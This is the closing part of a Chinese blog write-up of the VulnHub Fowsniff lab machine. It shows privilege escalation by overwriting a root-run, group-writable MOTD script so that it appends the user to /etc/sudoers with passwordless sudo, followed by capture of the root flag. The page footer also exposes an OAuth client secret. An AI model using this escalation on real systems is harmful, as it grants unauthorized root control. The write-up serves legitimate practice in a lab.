<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">baksteen@fowsniff:/etc/update-motd.d$ <span class="hljs-built_in">cat</span> 00-header <br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#    00-header - create the header of the MOTD</span><br><span class="hljs-comment">#    Copyright (C) 2009-2010 Canonical Ltd.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#    This program is free software; you can redistribute it and/or modify</span><br><span class="hljs-comment">#    it under the terms of the GNU General Public License as published by</span><br><span class="hljs-comment">#    the Free Software Foundation; either version 2 of the License, or</span><br><span class="hljs-comment">#    (at your option) any later version.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#    This program is distributed in the hope that it will be useful,</span><br><span class="hljs-comment">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="hljs-comment">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="hljs-comment">#    GNU General Public License for more details.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#    You should have received a copy of the GNU General Public License along</span><br><span class="hljs-comment">#    with this program; if not, write to the Free Software Foundation, Inc.,</span><br><span class="hljs-comment">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><br><span class="hljs-comment">#[ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release</span><br><br><span class="hljs-comment">#if [ -z &quot;$DISTRIB_DESCRIPTION&quot; ] &amp;&amp; [ -x /usr/bin/lsb_release ]; then</span><br><span class="hljs-comment">#       # Fall back to using the very slow lsb_release utility</span><br><span class="hljs-comment">#       DISTRIB_DESCRIPTION=$(lsb_release -s -d)</span><br><span class="hljs-comment">#fi</span><br><br><span class="hljs-comment">#printf &quot;Welcome to %s (%s %s %s)\n&quot; &quot;$DISTRIB_DESCRIPTION&quot; &quot;$(uname -o)&quot; &quot;$(uname -r)&quot; &quot;$(uname -m)&quot;</span><br><br>sh /opt/cube/cube.sh<br></code></pre></td></tr></table></figure>

<p>发现这个脚本会在用户登录时执行<code>/opt/cube/cube.sh</code>,并且还是以系统身份。</p>
<p>至此，我们的提权路径就已经很清晰明了了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">baksteen@fowsniff:/etc/update-motd.d$ <span class="hljs-built_in">cd</span> /opt/cube/<br>baksteen@fowsniff:/opt/cube$ ll<br>total 16<br>drwxrwxrwx 2 root     root  4096 May 25 13:04 ./<br>drwxr-xr-x 6 root     root  4096 Mar 11  2018 ../<br>-rw-rwxr-- 1 parede   <span class="hljs-built_in">users</span>   29 May 25 13:06 cube.sh*<br></code></pre></td></tr></table></figure>

<p><code>cube.sh</code>虽然拥有者是parede，但是只要是users组就能读写执行。那就别客气了。</p>
<p>直接进行一个sudoers的写入。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">baksteen@fowsniff:/opt/cube$ vim cube.sh<br>baksteen@fowsniff:/opt/cube$ <span class="hljs-built_in">cat</span> cube.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;baksteen ALL=(ALL) NOPASSWD:ALL&#x27;</span> &gt;&gt; /etc/sudoers<br>baksteen@fowsniff:/opt/cube$ <span class="hljs-built_in">exit</span><br><span class="hljs-built_in">logout</span><br>Connection to 192.168.56.107 closed.<br></code></pre></td></tr></table></figure>

<p>那么接下来，如果理想的话，就是我们登录时，系统在打印motd信息时执行我们的cube.sh,将baksteen用户写入sudoers，实现提权。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]<br>└─$ ssh baksteen@192.168.56.107                <br>baksteen@192.168.56.107<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">   ****  Welcome to the Fowsniff Corporate Server! **** </span><br><span class="hljs-string"></span><br><span class="hljs-string">              ---------- NOTICE: ----------</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Due to the recent security breach, we are running on a very minimal system.</span><br><span class="hljs-string"> * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Thu May 25 13:20:41 2023 from 192.168.56.144</span><br><span class="hljs-string">baksteen@fowsniff:~$ sudo -l</span><br><span class="hljs-string">Matching Defaults entries for baksteen on fowsniff:</span><br><span class="hljs-string">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="hljs-string"></span><br><span class="hljs-string">User baksteen may run the following commands on fowsniff:</span><br><span class="hljs-string">    (ALL) NOPASSWD: ALL</span><br><span class="hljs-string">baksteen@fowsniff:~$ sudo su</span><br><span class="hljs-string">root@fowsniff:/home/baksteen# whoami</span><br><span class="hljs-string">root</span><br><span class="hljs-string">root@fowsniff:/home/baksteen# cd ~</span><br><span class="hljs-string">root@fowsniff:~# ll</span><br><span class="hljs-string">total 28</span><br><span class="hljs-string">drwx------  4 root root 4096 Mar  9  2018 ./</span><br><span class="hljs-string">drwxr-xr-x 22 root root 4096 Mar  9  2018 ../</span><br><span class="hljs-string">-rw-r--r--  1 root root 3117 Mar  9  2018 .bashrc</span><br><span class="hljs-string">-rw-r--r--  1 root root  582 Mar  9  2018 flag.txt</span><br><span class="hljs-string">drwx------  5 root root 4096 Mar  9  2018 Maildir/</span><br><span class="hljs-string">drwxr-xr-x  2 root root 4096 Mar  9  2018 .nano/</span><br><span class="hljs-string">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="hljs-string">root@fowsniff:~# cat flag.txt </span><br><span class="hljs-string">   ___                        _        _      _   _             _ </span><br><span class="hljs-string">  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |</span><br><span class="hljs-string"> | (__/ _ \ &#x27;</span> \/ _` | <span class="hljs-string">&#x27;_/ _` |  _| || | / _` |  _| / _ \ &#x27;</span> \(_-&lt;_|<br>  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)<br>               |___/ <br><br> (_)<br>  |--------------<br>  |&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;|<br>  |    R O O T   |<br>  |    F L A G   |<br>  |&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;|<br>  |--------------<br>  |<br>  |<br>  |<br>  |<br>  |<br>  |<br> ---<br><br>Nice work!<br><br>This CTF was built with love <span class="hljs-keyword">in</span> every byte by @berzerk0 on Twitter.<br><br>Special thanks to psf, @nbulischeck and the whole Fofao Team.<br><br>root@fowsniff:~<span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure>

<p>我们发现，开头的cube图标没了，我们的脚本成功执行了。成功拿下root flag。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这台机子的突破部分主要考模拟真实环境下信息收集能力，<del>看你有没有梯子上推特</del>，然后是如何处理页面信息被删除情况下查看以前留下的信息。提权部分主要是看是否对应该手动枚举那些文件是否熟悉以及对motd的理解。</p>
<p>总之这台机子做的还是不错的，挺有意思。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/27/DC-1/">← Next [vulnhub]  DC:1</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/24/The%20Planets:%20Mercury/">[vulnhub]  The Planets: Mercury Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E5%8F%8A%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text">nmap及脚本扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E6%B8%97%E9%80%8F"><span class="toc-number">2.2.</span> <span class="toc-text">Web渗透</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%86%E5%BC%B1%E6%80%A7%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">脆弱性利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>